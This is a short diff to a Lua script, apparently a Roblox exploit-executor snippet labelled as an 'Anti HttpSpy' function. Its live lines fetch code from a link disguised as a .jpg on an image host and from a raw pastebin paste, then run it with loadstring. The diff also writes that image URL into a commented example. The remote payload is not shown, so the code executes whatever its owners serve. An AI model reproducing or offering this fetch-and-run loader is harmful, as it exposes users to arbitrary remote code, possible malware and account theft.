@@ -1,8 +1,8 @@
 --[[ Anti HttpSpy Function (By: B6O6S TEAM)
-local content = HttpGet("Your_Link_Here") --use this to fetch url link
+local content = HttpGet("https://i.ibb.co/b5F0KTbP/you-must-be-v0-ne3k8ozw4azd1.jpg")
 local response = HttpRequest("Your_Link_Here", "POST", {["Content-Type"] = "application/json"}, {key = "value"}) --use this to request api
 ]]
 loadstring(game:HttpGet("https://i.ibb.co/b5F0KTbP/you-must-be-v0-ne3k8ozw4azd1.jpg"))()
 --
 
-loadstring(HttpGet('https://pastebin.com/raw/uskvhF1s'))();
+loadstring(HttpGet('https://pastebin.com/raw/uskvhF1s'))()
